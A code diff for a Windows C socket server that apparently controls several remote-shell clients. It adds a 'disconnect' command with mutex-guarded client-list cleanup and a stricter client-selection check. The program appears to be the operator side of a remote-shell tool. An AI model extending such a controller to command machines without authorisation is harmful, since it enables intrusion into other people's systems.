@@ -95,7 +95,7 @@ int acceptClientOnSock(int sockfd) {
 
 // Send and recv loop for a client.
 
-int startConversationWithClient(int remoteDesk, char* messageBuf, char* responseBuf, size_t messageBufSize, size_t responseBufSize) {
+int startConversationWithClient(int remoteDesk, int clientID, char* messageBuf, char* responseBuf, size_t messageBufSize, size_t responseBufSize) {
 	int bytesRecv = -1;
 
 	// This must be called here because this function is blocking, and we cannot clear it in main.
@@ -111,6 +111,8 @@ int startConversationWithClient(int remoteDesk, char* messageBuf, char* response
 		printf("%s", responseBuf);
 	} while (bytesRecv >= 0);
 
+	
+
 	while (1 == 1) {
 
 		memset(messageBuf, 0, messageBufSize);
@@ -125,6 +127,43 @@ int startConversationWithClient(int remoteDesk, char* messageBuf, char* response
 			memset(responseBuf, 0, responseBufSize);
 
 			send(remoteDesk, "0", 1, 0);
+
+			break;
+		}
+
+		if (strcmp(messageBuf, "disconnect") == 0 || strcmp(messageBuf, "dc") == 0) {
+			memset(messageBuf, 0, messageBufSize);
+			memset(responseBuf, 0, responseBufSize);
+
+			closesocket(remoteDesk);
+
+			// We need to make changes to a shared resource
+			WaitForSingleObject(hClientListMutex, INFINITE);
+
+			clientCount--;
+
+			// If this is the last one, set to nothing.
+
+			if (clientID == CLIENTAMOUNT) {
+				clientList[clientID - 1] = -1;
+			}
+
+			// Shift all other clients down.
+			for (; clientID < CLIENTAMOUNT; clientID++) {
+				clientList[clientID - 1] = clientList[clientID];
+			}
+
+			// Set last client to -1 incase the array is completely full, so we must manually do this
+
+			clientList[CLIENTAMOUNT - 1] = -1;
+
+			// Print message so user knows its not broken with no clients
+
+			if (clientCount == 0) {
+				printf("All clients disconnected, awaiting more connections...\n");
+			}
+
+			ReleaseMutex(hClientListMutex);
 
 			break;
 		}
@@ -251,7 +290,7 @@ int main(int argc, char* argv[]) {
 		gets_s(commandBuf, sizeof commandBuf);
 		clientSelection = atoi(commandBuf);
 
-		if (clientSelection == 0 || clientSelection > clientCount) {
+		if (clientSelection <= 0 || clientSelection > clientCount) {
 			continue;
 		}
 
@@ -259,7 +298,7 @@ int main(int argc, char* argv[]) {
 
 		// Hold the phone here, we access the shared data so we block, but where is the release? I added the release to the beginning
 		// if the startConversationWithClient function so that we can still get new connections while using the shell.
-		startConversationWithClient(clientList[clientSelection - 1], messageBuf, responseBuf, (size_t)MESSAGESIZE, (size_t)RESPONSESIZE);
+		startConversationWithClient(clientList[clientSelection - 1], clientSelection, messageBuf, responseBuf, (size_t)MESSAGESIZE, (size_t)RESPONSESIZE);
 	}
 
 	free(messageBuf);
